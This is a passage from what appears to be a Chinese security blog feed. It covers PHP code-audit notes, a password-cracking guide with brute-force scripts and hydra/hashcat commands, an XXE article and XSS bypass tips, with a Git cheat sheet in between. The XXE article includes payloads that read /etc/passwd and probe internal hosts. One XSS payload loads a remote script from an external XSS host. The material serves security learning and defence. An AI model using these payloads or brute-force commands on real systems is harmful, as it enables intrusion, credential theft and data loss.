<p>4.magic_quotes_runtime(魔术引号自动过滤)和上面一样，只是它只对从数据库或者文件中获取的数据进行过滤</p>
<p>5.magic_quotes_sybase(魔术引号自动过滤)只是将单引号转为双引号，转义空字节</p>
<p>6.safe_mode=on(安全模式)PHP5.4之后取消</p>
<p>7.open_basedir(PHP可访问目录)多个用<code>;</code>隔开</p>
<p>8.disable_functions(禁用函数)例如可以=<code>phpinfo、eval、passthru、exec、system</code></p>
<p>9.display_errors和error_reporting=Off(错误显示)</p>
<p><strong>常见的代码审计思路</strong></p>
<p>1.根据敏感关键字回溯参数传递过程</p>
<p>2.查找可控变量，正向追踪变量传递过程</p>
<p>3.寻找敏感功能点，通读功能点代码</p>
<p>4.直接通读全文代码</p>
<p>文件上传时可以测试文件名是否存在SQL注入.</p>
<p>二次注入原理图,实例请看<a href="http://byd.dropsec.xyz/2016/07/29/SQL-Labs%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">sqli-labs-24</a></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/%E4%BA%8C%E6%AC%A1%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86.png" alt=""></p>
<p>SQL请求头注入：user-agent/referer/client-ip/x-forward-for</p>
<p>对宽字节注入的挖掘主要看如下关键字：</p>
<pre><code>SET NAMES

character_set_client=gbk

mysql_set_charset(&apos;gbk&apos;)
</code></pre><p>二次urldecode注入：<code>1.php?id=1%2527</code></p>
<p>intval等字符转换<code>intval(&quot;1&#39; union select &quot;)</code> 输出：1</p>
<p>关于宽字节注入的推荐解决方法：</p>
<pre><code>1.在执行查询前先执行SET NAMES &apos;gbk&apos;设置编码，设置character_set_client=binary
2.使用mysql_set_charset(&apos;gbk&apos;)设置编码，然后使用mysql_real_escasp_string()函数过滤参数
3.使用pdo方式，在PHP5.3.6及以下版本需要设置setAttribute来禁用prepared statements的防真效果
</code></pre><p>对于CSRF的防御：</p>
<pre><code>1.增加token/referer验证避免img标签请求的攻击
2.增加验证码
</code></pre><p>Token实现测试代码：</p>
<pre><code>&lt;?php
session_start();
function set_token() {
    $_SESSION[&apos;token&apos;] = md5(time()+rand(1,1000));
    echo $_SESSION[&apos;token&apos;];
    echo &apos;&lt;/br&gt;&apos;;
}
function check_token() {
    if(isset($_POST[&apos;token&apos;])&amp;&amp;$_POST[&apos;token&apos;] === $_SESSION[&apos;token&apos;])
        return true;
    else
        return false;
}
if(isset($_SESSION[&apos;token&apos;])&amp;&amp;check_token()) {
    echo &quot;success&quot;;
    echo &apos;&lt;/br&gt;&apos;;
}
else {
    echo &quot;failed&quot;;
    echo &apos;&lt;/br&gt;&apos;;
}
set_token();
?&gt;
&lt;form method=&quot;post&quot;&gt;
    &lt;input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;&lt;?=$_SESSION[&apos;token&apos;]?&gt;&quot;&gt;
    &lt;input type=&quot;submit&quot;/&gt;
&lt;/form&gt;
</code></pre><p>文件包含函数的区别：</p>
<pre><code>include()、include_once()在文件包含时即使遇到错误，下面的代码依然会继续执行
require()、require_once()则会直接报错退出程序
</code></pre><p>windows下可以包含日志文件</p>
<p>linux下可以包含/proc/self/environ(链接当前正在运行环境的进程)、/etc/passwd(密码文件) 等文件</p>
<p><code>php://filter/</code> PHP输入输出流读取文件</p>
<p>文件上传函数<code>move_uploaded_file()</code></p>
<p>在上传文件时，在文件名后面加个空格（%20,或者%81-%99)，有时候可以绕过黑名单限制。</p>
<p>文件上传防御：</p>
<pre><code>1.白名单方式过滤文件扩展名，使用in_array或者===来对比扩展名
2.保存文件时重命名文件，文件命名规则采用时间戳的拼接随机数的MD5方式&quot;md5(time()+rand(1,1000))&quot;.
</code></pre><p>代码执行漏洞函数：</p>
<blockquote>
<p>eval(),assert(),preg_replace(),call_user_func(),call_user_func_array(),array_map()</p>
</blockquote>
<p>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject )<br>搜索subject中匹配pattern,用replacement替换。如果pattern处存在/e参数，则replacement的值会被当成PHP代码来执行。</p>
<p>命令执行漏洞函数：</p>
<blockquote>
<p>system(),exec(),shell_exec(),passyhru(),pcntl_exec(),popen(),proc_open(),`</p>
</blockquote>
<p>命令执行防注入函数：</p>
<pre><code>escapeshellcmd(),过滤整条命令(加^)
&lt;?php 
    echo (escapeshellcmd($_GET[&apos;cmd&apos;]));
?&gt;
?cmd=whoami()
输出：whoami^()
escapesshellarg(),保证传入命令的参数是以字符串的形式存在
&lt;?php 
    echo &apos;ls &apos;.escapeshellarg(&apos;cmd&quot;&apos;);
?&gt;
输出：ls &quot;cmd &quot;
</code></pre><p>is_numeric()函数使用十六进制绕过</p>
<p>==在判断之前先做变量类型转换，即只判断值</p>
<p>===不会转换，即既判断值还判断类型</p>
<p>%00=NULL=0</p>
<p>http头注入常见的:user-agent,referer,client-ip/x-forward-for</p>
<p>$_SERVER和$_FILES变量不受GPC保护</p>
<p>显示错误信息的函数开关:display_errors和error_reporting</p>
<p>PHP是基于C开发，<code>%00</code>在URL编码后市<code>\0</code>，<code>\0</code>在C语言中是字符串的结束符。</p>
<p>iconv函数字符编码转换过程中遇到不能处理的字符串则后续的字符串也不会处理，导致截断（char(128)到char(255)之间都可以）</p>
<p><strong>php://输入输出流</strong></p>
<p><code>php://input</code>可以访问请求的原始数据的只读流，即可以直接读取到POST上没有经过解析的原始数据。</p>
<p><code>php://output</code>是一个只写流，将流数据输出</p>
<p><code>php://filter</code>是一个文件操作协议，可以对磁盘中的文件进行读写操作</p>
<pre><code>php://filter/write=string.rot13/resource=example.txt,&quot;hello world&quot;

php://filter/convert.base64-encode/resource=index.php
</code></pre><p><strong>PHP代码解析标签</strong></p>
<p>脚本标签: <code>&lt;script language=&quot;php&quot;&gt;...&lt;/script&gt;</code></p>
<p>短标签：<code>&lt;?...?&gt;</code>,需要php.ini中short_open_tag=on,默认是on</p>
<p>asp标签：<code>&lt;%...%&gt;</code>,需要php.ini中asp_tags=on，默认是off</p>
<p>client-ip的正则规则：<code>^\d+\.\d+\.\d+\.\d+$</code></p>
<p>test.php%00jpg</p>
<p>mysql报错注入的函数：<code>floor(),updatexml(),extractvalue()</code></p>
<p>具体介绍请参考：<a href="http://byd.dropsec.xyz/2016/08/02/Mysql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">MySql注入总结</a></p>
<p>windows findfirstfile利用：即使用<code>&lt;</code>,<code>&gt;</code>来代替不可知的文件名部分，如123.txt可以使用1&lt;&lt;来替换。</p>
<p>PHP中单引号代表纯字符串，双引号则是会解析中间的变量：</p>
<pre><code>&lt;?php $a=&quot;${@phpinfo()}&quot;;?&gt;        #第一个字符为@
&lt;?php $a=&quot;${ phpinfo()}&quot;;?&gt;        #第一个字符为空格
&lt;?php $a=&quot;${    phpinfo()}&quot;;?&gt;    #第一个字符为TAB
&lt;?php $a=&quot;${/**/phpinfo()}&quot;;?&gt;    #第一个字符为注释符
&lt;?php $a=&quot;${
phpinfo()}&quot;;?&gt;                    #第一个字符为回车换行
&lt;?php $a=&quot;${+phpinfo()}&quot;;?&gt;        #第一个字符为+
&lt;?php $a=&quot;${-phpinfo()}&quot;;?&gt;        #第一个字符为-
&lt;?php $a=&quot;${!phpinfo()}&quot;;?&gt;        #第一个字符为！
此外还有~，\等
</code></pre><p>对称加密算法：<code>DES,3DES,TDEA,RC2,RC4,IDEA,AES</code></p>
<p>非对称加密：<code>RSA</code></p>
<p>单向加密：<code>MD4,MD5,sha1</code></p>
<p>验证码绕过：</p>
<pre><code>1.不刷新直接绕过
2.暴力破解
3.机器识别
4.打码平台
</code></pre><p>用户登录漏洞：</p>
<pre><code>1.撞库漏洞
    用户名密码错误次数都无限制
    单时间段内用户的密码错误次数限制
    单时间段内IP登陆错误次数限制
2.API登陆
</code></pre><p>最后附上一个搜集的PHP代码审计脑图</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%84%91%E5%9B%BE.png" alt=""></p>
]]></content>
      
        
        <tags>
            
            <tag> XSS </tag>
            
            <tag> WAF绕过 </tag>
            
            <tag> PHP </tag>
            
            <tag> 命令执行 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> 文件包含 </tag>
            
            <tag> 安全开发 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[渗透测试:密码破解总结]]></title>
      <url>/2016/08/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%EF%BC%9A%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>一次渗透测试的过程总会涉及到”密码”与”加解密”.在测试的过程中,对弱口令的尝试是必不可少的过程。</p>
<a id="more"></a>
<h1 id="0x01-整理一份优秀的字典"><a href="#0x01-整理一份优秀的字典" class="headerlink" title="0x01 整理一份优秀的字典"></a>0x01 整理一份优秀的字典</h1><p>想破解密码,要求我们已经”拥有”别人的密码.要整理一份优秀的字典,可以参考各大网站泄漏数据库,将密码(明文)字段收集后,依出现频率先后生成字典.</p>
<p>这里使用一个对已知的字典文件根据使用频率排序并输出的python脚本：</p>
<pre><code>#!/bin/bash/python
#+------------------------------+
#@Author:Joy_nick
#@Blog:http://byd.dropsec.xyz/
#+------------------------------+
import sys
from collections import Counter

file = open(sys.argv[1], &apos;r&apos;)
readlist = []
count_times = []
for line in file.readlines():
    line = line.strip(&apos;\r\n &apos;)
    readlist.append(line)
sortlist = Counter(readlist).most_common()
for line in sortlist:
    print line[0]
</code></pre><p>示例：</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3_1.png" alt=""></p>
<h1 id="0x02-一手称心如意的工具集"><a href="#0x02-一手称心如意的工具集" class="headerlink" title="0x02 一手称心如意的工具集"></a>0x02 一手称心如意的工具集</h1><p>欲善其事,须利其器.密码枚举工具举一些例子：</p>
<ul>
<li>Hydra :各种服务账户密码猜解</li>
<li>Medusa : 类似Hydra</li>
<li>Patator : Python多协议，全能暴力破解，模块化设计测试工具</li>
<li>Hashcat : GPU哈希破解</li>
<li>BurpSuite : 多线程密码枚举</li>
<li>Rcracki : 彩虹表哈希破解</li>
<li>Ophcrack : 离线LMHash/NTHash破解</li>
<li>Fcrackzip/Truecrack等特定文件密码破解工具</li>
<li>Metasploit : 各种辅助测试脚本</li>
<li>Cupp.py : 社工字典生成</li>
<li>…</li>
</ul>
<h1 id="0x03-绕过检测"><a href="#0x03-绕过检测" class="headerlink" title="0x03 绕过检测"></a>0x03 绕过检测</h1><p>Web层有WAF,Service有IDS/IPS,在测试的时候很容易被发现。在测试前,先通过扫描等方式判断是否有相应的防护,并采取相应手段.Web层可能有验证码,可能有每秒IP连接数限制,可能通过Cookie/Header等信息判断行为.在通过一系列测试后,(如何测试还是要自己探索的),采用最合理的针对方式绕过或尽量避免被检测而拦截枚举账户密码。</p>
<h1 id="0x04-Web账户枚举"><a href="#0x04-Web账户枚举" class="headerlink" title="0x04 Web账户枚举"></a>0x04 Web账户枚举</h1><p>Web账户枚举是平日遇到较多的情况</p>
<ul>
<li>没有做严谨的验证码等防护.</li>
<li>发现别人留下的backdoor.</li>
<li>撞库扫号.</li>
</ul>
<p>常见的绕过验证的可能:</p>
<ul>
<li>页面无需刷新验证码无限次使用</li>
<li>密码输入错误数次弹出验证码，但更换账号不会出现验证码</li>
<li>修改Cookie或User-Agent伪装逃避验证码</li>
<li>可批量轮询使用代理ip枚举绕过</li>
</ul>
<p>在Web枚举中,使用BurpSuite基本可以解决所有常见问题.</p>
<p>开启代理,打开Intercept,登陆网页,输入用户密码,数据包拦截下来,选择Send to Intruder,进入攻击模块.</p>
<p>其中四种模式:</p>
<pre><code>Sniper:只有一个payload,会将payload分别放在每个Fuzz点测试,默认选项,这也是新手发现Payload只能选择1的原因.

Battering Ram:只有一个payload,会将payload同时放在多个Fuzz点测试.

Pitchfork:多个payload,会将多个payload同一行同时放到相应Fuzz点测试.(适用扫号)

Cluster Bomb:多个payload,payload在其Fuzz点循环测试,直到尝试所有可能.(适用多账户枚举密码)
</code></pre><p>选择好相应模式后,设置payload为runtime file,挂载字典文件.取消Payload Encoding.</p>
<p>如果发现网页有将用户的本地将密码计算MD5后提交,则需要在Payload Processing中添加计算MD5的过程.</p>
<p>设置好后也可添加正则匹配结果等等.之后可以Start attack了.</p>
<p>这个过程中,如果担心IP地址暴露,可以选择加入一个client-ip这个payload来代理ip。</p>
<h1 id="0x05-HTTP基础认证"><a href="#0x05-HTTP基础认证" class="headerlink" title="0x05 HTTP基础认证"></a>0x05 HTTP基础认证</h1><p>抓包可以看到,以默认用户名admin,默认密码admin登陆路由,HTTP Header多的部分像是这样:</p>
<pre><code>Authorization: Basic YWRtaW46YWRtaW4=
</code></pre><p>Base64解密即为admin:admin.针对基础认证密码破解,依旧可以使用,但需要对用户名密码先做处理即先base64编码下,一个demo脚本如下:</p>
<pre><code>#!/usr/bin/python
#+------------------------------+
#@Author:Joy_nick
#@Blog:http://byd.dropsec.xyz/
#+------------------------------+
import os.path,sys,base64

userfile = raw_input(&quot;input usr file:&quot;)
passfile = raw_input(&quot;input pwd file:&quot;)
outputfile = raw_input(&quot;input out file:&quot;)
outputfile = open(outputfile, &quot;w&quot;)
userInfile = open(userfile)
passInfile = open(passfile)
userLines = userInfile.readlines()
passLines = passInfile.readlines()

for userLine in userLines:
    for passLine in passLines:
        combinedLine = userLine.strip() + &apos;:&apos; + passLine.strip()
        print combinedLine
        outputfile.write(base64.b64encode(combinedLine) + &apos;\n&apos;)
userInfile.close()
passInfile.close()
outputfile.close()
</code></pre><p>生成字典后以Burp爆破即可.</p>
<p>也可以使用Hydra</p>
<pre><code>hydra -L user.txt -P pass.txt -F http://demourl:2048/auth
其中-L和-P大写均为挂载字典,-F表示全局一旦发现合法用户密码即停止破解,亦可加入-t参数指定线程数.
</code></pre><h1 id="0x06-服务密码破解"><a href="#0x06-服务密码破解" class="headerlink" title="0x06 服务密码破解"></a>0x06 服务密码破解</h1><p>常见服务如FTP/SSH/TELNET/POP3/1433等的破解枚举.</p>
<ul>
<li><p>FTP</p>
<pre><code>hydra -L user.txt -P pass.txt -F ftp://127.0.0.1:21
</code></pre></li>
<li><p>SSH</p>
<pre><code>hydra -L user.txt -P pass.txt -F ssh://127.0.0.1:22

patator ssh_login host=127.0.0.1 user=root password=FILE0 0=pass.txt -x ignore:mesg=&apos;Authentication failed.&apos;
</code></pre></li>
<li><p>SMB</p>
<pre><code>hydra -L user.txt -P pass.txt -F smb://127.0.0.1
</code></pre></li>
<li><p>MSSQL</p>
<pre><code>hydra -L user.txt -P pass.txt -F mssql://127.0.0.1:1433
</code></pre></li>
</ul>
<h1 id="0x07-社工字典生成"><a href="#0x07-社工字典生成" class="headerlink" title="0x07 社工字典生成"></a>0x07 社工字典生成</h1><p>以cupp.py工具为例,创建新字典使用:</p>
<pre><code>python cupp.py -i

用法： cupp.py [选项]

h 帮助
i 交互式填写用户密码等相关信息
w 配置现有的字典文件
l 从库中下载
a 直接使用Alecto数据库的默认用户名和密码
v 版本信息
</code></pre><p>在填写相关信息后生成字典,然后就可以枚举了。</p>
<h1 id="0x08-哈希破解"><a href="#0x08-哈希破解" class="headerlink" title="0x08 哈希破解"></a>0x08 哈希破解</h1><p>普通哈希可以使用Ophcrack破解,官网给出了对应的彩虹表下载,当然,也可以直接查询.</p>
<pre><code>http://www.objectif-securite.ch/en/ophcrack.php
</code></pre><p>需要破解其他不常见密码哈希(借助已有web破解服务无法解决),暂时便只有三个相对高效的方法:</p>
<ul>
<li>分布式</li>
<li>GPU</li>
<li>彩虹表 (没硬盘的就别想了)</li>
</ul>
<p>而如果我们在知道密码的一定规则后,亦可按照规则破解密码.</p>
<pre><code>hashcat -m1800 -a3 hashdumpedfile --pw-min=7 --pw-max=11  &quot;hahaha?l?l?l?l&quot;
</code></pre><p>具体的hashcat密码破解详情请参考：<a href="http://byd.dropsec.xyz/2016/08/10/HashCat%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/">HashCat使用手册</a></p>
<h1 id="0x09-文件密码"><a href="#0x09-文件密码" class="headerlink" title="0x09 文件密码"></a>0x09 文件密码</h1><p>对于zip文件,由于加密方式没有rar强势,故被解密的可能性很大,一个kali下的破解工具命令如下:</p>
<pre><code>fcrackzip -b -v -c a -l 1-4 -u 1.zip
</code></pre><p>-b指定暴力破解,-v显示详细信息,-c a指定密码为纯字母,-l 1-4指定密码长度位1-4位,-u指使用可能的密码进行解压缩测试(加上,否则会出现很多干扰密码)</p>
<p>具体的其他语法请参考：<a href="http://ylq365.iteye.com/blog/1915531" target="_blank" rel="external">fcrackzip语法示例</a></p>
]]></content>
      
        
        <tags>
            
            <tag> 爆破 </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[XXE Inject攻击与防御]]></title>
      <url>/2016/08/16/XXE-Inject%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/</url>
      <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>XXE Injection即XML External Entity Injection,也就是XML外部实体注入攻击.</p>
<p>在XML1.0标准⾥里,XML文档结构里定义了实体(entity)这个概念.实体可以通过预定义在文档中调用,实体的标识符可访问本地或远程内容.如果在这个过程中引入了”污染”源,在对XML文档处理后则可能导致信息泄漏等安全问题.<br><a id="more"></a></p>
<h1 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h1><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。</p>
<pre><code>&lt;!DOCTYPE 根元素 [元素声明]&gt;

&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;
</code></pre><p>DTD实体entity，一般分为参数实体(外部实体)和内部实体；参数实体是一种只能在DTD中定义和使用的实体，一般引用时使用%作为前缀；内部实体是指用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用.</p>
<pre><code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;

&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;
</code></pre><p>所以在XML中实体的用法如下：</p>
<pre><code>ENTITY的定义语法：

&lt;!DOCTYPE filename
[  
    &lt;!ENTITY entity-name &quot;entity-content&quot;  
]&gt;

//这就是DTD了
</code></pre><p>定义好的ENTITY在文档中通过“&amp;实体名;”来使用。<br>类似于宏定义的一种东西。</p>
<h1 id="0x02-威胁"><a href="#0x02-威胁" class="headerlink" title="0x02 威胁"></a>0x02 威胁</h1><p>借助XXE,攻击者可以实现<strong>任意文件读取</strong>,<strong>DOS拒绝服务攻击</strong>以及<strong>代理扫描内网</strong>等.</p>
<p>对于不同XML解析器,对外部实体有不同处理规则,在PHP中默认处理的函数为:</p>
<blockquote>
<p>xml_parse和simplexml_load</p>
</blockquote>
<p>xml_parse的实现方式为expat库，默认情况不会解析外部实体,而simplexml_load默认情况下会解析外部实体,造成安全威胁.</p>
<p>除PHP外，在Java，Python等处理xml的组件及函数中都可能存在此问题.</p>
<h1 id="0x03-语法"><a href="#0x03-语法" class="headerlink" title="0x03 语法"></a>0x03 语法</h1><p>举一个简单的例子：</p>
<pre><code>&lt;?php
$fileread = &lt;&lt;&lt;XML
&lt;!-- validators.en.xliff --&gt;
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
&lt;!DOCTYPE dropsec [
&lt;!ELEMENT methodname ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;file://C:/phpStudy/WWW/XXE/file.ext&quot; &gt;]&gt;
&lt;methodname&gt;&amp;xxe;&lt;/methodname&gt;
XML;
$data = simplexml_load_string($fileread);
print_r($data);
?&gt;
</code></pre><p>如果要引用一个外部资源,可以借助各种协议，这里通过<code>file://</code> 协议引入了外部实体.</p>
<pre><code>file:///path/to/file.ext
http://url/file.ext
php://filter/read=convert.base64-encode/resource=conf.php
</code></pre><p>也可读取网站内容</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
&lt;!DOCTYPE dropsec [
&lt;!ELEMENT methodname ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;http://byd.dropsec.xyz/robots.txt&quot; &gt;]&gt;
&lt;methodname&gt;&amp;xxe;&lt;/methodname&gt;
</code></pre><p>通过上面可以用来内网探测，如果安装了expect扩展组件甚至可以用来进行内网渗透。</p>
<p>如果包含文件失败,可能是由于读取php等文件时文件本身包含的&lt;等字符.可以使用Base64编码绕过,如:</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
&lt;!DOCTYPE dropsec [
&lt;!ELEMENT methodname ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot; &gt;]&gt;
&lt;methodname&gt;&amp;xxe;&lt;/methodname&gt;
</code></pre><p>内部实体的这支持与否也是取决于解释器的。不同的浏览器不一样，不通语言默认也不一样。所以利用比较困难。</p>
<p>但实际上XML外部实体的解析，和php版本并无关系，而是和编译时的libxml库版本有关。</p>
<h1 id="0x04-攻击"><a href="#0x04-攻击" class="headerlink" title="0x04 攻击"></a>0x04 攻击</h1><p>1.拒绝服务</p>
<p><a href="http://www.baidu.com/" target="_blank" rel="external">POC</a></p>
<p>2.内网信息</p>
<p>借助各种协议如http,XXE可以协助扫描内网,可能可以访问到内网开放WEB服务的Server,并获取其他信息.</p>
<pre><code>&lt;!ELEMENT portscan SYSTEM &apos;http://192.168.2.1/&apos; &gt;
&lt;!ELEMENT smb SYSTEM &apos;\\192.168.2.1\c$&apos; &gt;
&lt;!ELEMENT sql SYSTEM &apos;http://192.168.2.1/index.php?id=1;drop table myweb;#&apos; &gt;
</code></pre><p>3.文件读取</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
&lt;!DOCTYPE dropsec [
&lt;!ELEMENT methodname ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;
&lt;methodname&gt;&amp;xxe;&lt;/methodname&gt;
</code></pre><h1 id="0x05-防御"><a href="#0x05-防御" class="headerlink" title="0x05 防御"></a>0x05 防御</h1><p>1、对于PHP,由于simplexml_load_string函数的XML解析问题出在libxml库上,所以可以提前加上:</p>
<blockquote>
<p>&lt;?php libxml_disable_entity_loader(true); ?&gt;</p>
</blockquote>
<p>2、检查所使用的底层xml解析库，默认禁止外部实体的解析.</p>
<p>3、对于XMLReader和DOM方式解析.</p>
<pre><code>&lt;?php 

// with the XMLReader functionality: 

$doc = XMLReader::xml($badXml,&apos;UTF-8&apos;,LIBXML_NONET); 

// with the DOM functionality: 

$dom = new DOMDocument(); 

$dom-&gt;loadXML($badXml,LIBXML_DTDLOAD|LIBXML_DTDATTR); 

?&gt;
</code></pre>]]></content>
      
        
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> XXE </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Git 常用命令速查表]]></title>
      <url>/2016/08/15/Git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5%E8%A1%A8/</url>
      <content type="html"><![CDATA[<p>Git 是目前世界上最先进的分布式版本控制系统（没有之一）。<br>Git有什么特点？简单来说就是：高端大气上档次！</p>
<a id="more"></a>
<h1 id="0x01-分支"><a href="#0x01-分支" class="headerlink" title="0x01 分支"></a>0x01 分支</h1><p>master: 默认开发分支</p>
<p>Head： 默认开发分支</p>
<p>origin： 默认远程版本库</p>
<p>head^： Head的父提交</p>
<h1 id="0x02-创建版本库"><a href="#0x02-创建版本库" class="headerlink" title="0x02 创建版本库"></a>0x02 创建版本库</h1><pre><code>$ git clone &lt;ur&gt;    #克隆远程版本库
$ git init          #初始化本地版本库
</code></pre><h1 id="0x03-修改和提交"><a href="#0x03-修改和提交" class="headerlink" title="0x03 修改和提交"></a>0x03 修改和提交</h1><pre><code>$ git status                    #查看状态
$ git diff                      #查看变更内容
$ git add .                     #跟踪所有改动过的文件
$ git add &lt;file&gt;                #跟踪指定文件
$ git mv &lt;old&gt; &lt;new&gt;            #文件改名
$ git rm &lt;file&gt;                 #删除文件
$ git rm --cached &lt;file&gt;        #停止跟踪文件但不删除
$ git commit -m &quot;commit message&quot;#提交所有更新过的文件
$ git commit --amend            #修改最后一次提交
</code></pre><h1 id="0x04-查看提交历史"><a href="#0x04-查看提交历史" class="headerlink" title="0x04 查看提交历史"></a>0x04 查看提交历史</h1><pre><code>$ git log                       #查看提交历史
$ git log -p &lt;file&gt;             #查看指定文件的提交历史
$ git blame &lt;file&gt;              #以列表方式查看指定文件的提交历史
</code></pre><h1 id="0x05-撤销"><a href="#0x05-撤销" class="headerlink" title="0x05 撤销"></a>0x05 撤销</h1><pre><code>$ git reset --hard HEAD          #撤销工作目录中所有未提交文件的修改内容
$ git checkout HEAD &lt;file&gt;       #撤销指定的未提交文件的修改内容
$ git revert &lt;commit&gt;            #撤销指定的提交
</code></pre><h1 id="0x06-分支与标签"><a href="#0x06-分支与标签" class="headerlink" title="0x06 分支与标签"></a>0x06 分支与标签</h1><pre><code>$ git branch                    #显示所有本地分支
$ git checkout &lt;branch/tag&gt;     #切换到指定分支或者标签
$ git branch &lt;new-nbranch&gt;      #创建新分支
$ git branch -d &lt;branch&gt;        #删除本分支
$ git tag                        #列出所有本地标签
$ git tag &lt;tagname&gt;             #基于最新提交创建标签
$ git tag -d &lt;tagname&gt;          #删除标签
</code></pre><h1 id="0x07-合并与衍合"><a href="#0x07-合并与衍合" class="headerlink" title="0x07 合并与衍合"></a>0x07 合并与衍合</h1><pre><code>$ git merge &lt;branch&gt;            #合并指定分支到当前分支
$ git rebase &lt;branch&gt;           #衍合指定分支到当前分支
</code></pre><h1 id="0x08-远程操作"><a href="#0x08-远程操作" class="headerlink" title="0x08 远程操作"></a>0x08 远程操作</h1><pre><code>$ git remote -v                      #查看远程版本库信息
$ git remote show &lt;remote&gt;           #查看指定远程版本库信息
$ git remote add &lt;remote&gt; &lt;url&gt;      #添加远程版本库
$ git fetch &lt;remote&gt;                 #从远程库获取代码
$ git pull &lt;remote&gt; &lt;branch&gt;         #下载代码及快速合并
$ git push &lt;remote&gt; &lt;branch&gt;         #上传代码及快速合并
$ git push &lt;remote&gt; :&lt;branch/tagname&gt;#删除远程分支或标签
$ git push --tags                    #上传所有标签
</code></pre>]]></content>
      
        
        <tags>
            
            <tag> Git </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CTF中一些绕过网站访问限制的技巧]]></title>
      <url>/2016/08/12/CTF%E4%B8%AD%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E7%BD%91%E7%AB%99%E8%AE%BF%E9%97%AE%E9%99%90%E5%88%B6%E7%9A%84%E6%8A%80%E5%B7%A7/</url>
      <content type="html"><![CDATA[<p>平时访问网站或者做 CTF 题的时候会遇到网站限制访问的问题，下面是一些小技巧，主要是通过 BurpSuite 拦截 HTTP 请求并根据需要修改 HTTP 请求头的内容来达到绕过的目的。</p>
<a id="more"></a>
<p>1、看起来只允许国外访问，有可能是 HTTP 请求头中的 Accept-Language 为中文(cn-zh)，修改为英文(en-us)即可</p>
<p>2、浏览器类型限制：修改 HTTP 请求中的 User-Agent</p>
<p>3、IP地址限制：可能跟 HTTP 请求头中的 X-Forwarded-For、client-ip、remote_addr 有关，或者挂代理。</p>
<p>4、需要登录，可能是 Cookie 的问题，如果 Cookie 比较简单，试试能不能构造。</p>
<p>5、尝试查看 robots.txt 可以获得该网站的一些信息。</p>
<p>6、有一些加referer加上代理ip。</p>
]]></content>
      
        
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WAF绕过 </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[XSS一些小技巧]]></title>
      <url>/2016/08/12/XSS%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
      <content type="html"><![CDATA[<p>1、<a href="http://www.wooyun.org/bugs/wooyun-2013-034003" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2013-034003</a></p>
<pre><code>&lt;textarea/&gt;&quot;&gt;&lt;img src=1 onerror=&quot;with(document)body.appendChild(createElement(String.fromCharCode(115,99,114,105,112,116))).src=&apos;//pxss.sinaapp.com/l6OBji&apos;&quot;&gt;

&lt;textarea/&gt;&lt;iframe src=http://www.baidu.com/&gt;&lt;/iframe&gt;
</code></pre><a id="more"></a>
<p>2、只有数据包中http头含有X-XSS-Protection并且值为0的时候，浏览器才不会开启xss filter。</p>
<p>3、可以利用字符编码来绕过XSS Filter的方法，当编码是is-2022-kr时浏览器会忽略%0f，这样我们在onerror后面加个%0f就能绕过filter，前提是注入一个<code>&lt;meta charset=ISO-2022-KR&gt;</code></p>
<p>4、<code>&lt;iframe srcdoc=&#39;&lt;script&gt;alert(1)&lt;/script&gt;&#39;&gt;</code></p>
<p>不是以on开头的  又可以执行JS的iframe属性。</p>
<p>5、</p>
<pre><code>&lt;a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=&gt;aa&lt;/a&gt;
</code></pre><p>6、    </p>
<pre><code>&lt;a href=javascirpt:alert(1)&gt;请点击&lt;/a&gt;
